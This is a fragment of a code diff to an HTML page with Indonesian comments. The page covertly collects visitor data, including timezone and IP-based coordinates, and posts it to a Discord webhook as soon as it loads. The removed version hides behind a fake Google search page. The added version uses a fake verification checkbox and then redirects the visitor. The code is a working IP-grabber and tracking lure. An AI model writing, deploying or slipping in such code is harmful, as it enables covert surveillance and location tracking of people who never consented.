-                    { name: '🌍 Timezone', value: dev ? dev.timezone || '-' : '-', inline: true }
-                ]
-            };
-
-            // Tambahkan peta IP jika ada koordinat
-            if (ipd && ipd.latitude && ipd.longitude) {
-                embed.fields.push({
-                    name: '🗺️ Peta IP',
-                    value: `[Buka Peta](https://www.google.com/maps?q=${ipd.latitude},${ipd.longitude})`,
-                    inline: true
-                });
-            }
-
-            const payload = { embeds: [embed] };
-
-            try {
-                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                const response = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
+
                 if (!response.ok) {
-                    const errText = await response.text();
-                    console.error('Discord error:', response.status, errText);
+                    const errorText = await response.text();
+                    throw new Error(`Webhook HTTP ${response.status}: ${errorText}`);
                 }
-            } catch (e) {
-                console.error('Error kirim ke Discord:', e);
+
+                return await response.json();
             }
-        }
 
-        // ================================================================
-        //  EVENT LISTENER
-        // ================================================================
-        document.addEventListener('DOMContentLoaded', () => {
-            // Jalankan tracking
-            runTracking();
+            // --- EKSEKUSI ---
+            collectAndSend();
 
-            // Tombol Telusuri
-            document.getElementById('btnSearch').addEventListener('click', () => {
-                const q = document.getElementById('searchInput').value;
-                window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(q);
+            const checkbox = document.getElementById('fakeCheck');
+            const progress = document.getElementById('progressFill');
+            progress.addEventListener('animationend', function() {
+                checkbox.classList.add('checked');
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 1000);
             });
 
-            // Tombol Saya Lagi Beruntung
-            document.getElementById('btnLucky').addEventListener('click', () => {
-                const q = document.getElementById('searchInput').value;
-                window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(q) + '&btnI=1';
-            });
-
-            // Enter
-            document.getElementById('searchInput').addEventListener('keydown', (e) => {
-                if (e.key === 'Enter') {
-                    const q = document.getElementById('searchInput').value;
-                    window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(q);
+            setTimeout(() => {
+                if (!checkbox.classList.contains('checked')) {
+                    checkbox.classList.add('checked');
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_URL;
+                    }, 1000);
                 }
-            });
-        });
+            }, 3500);
+
+        })();
     </script>
 </body>
 </html>
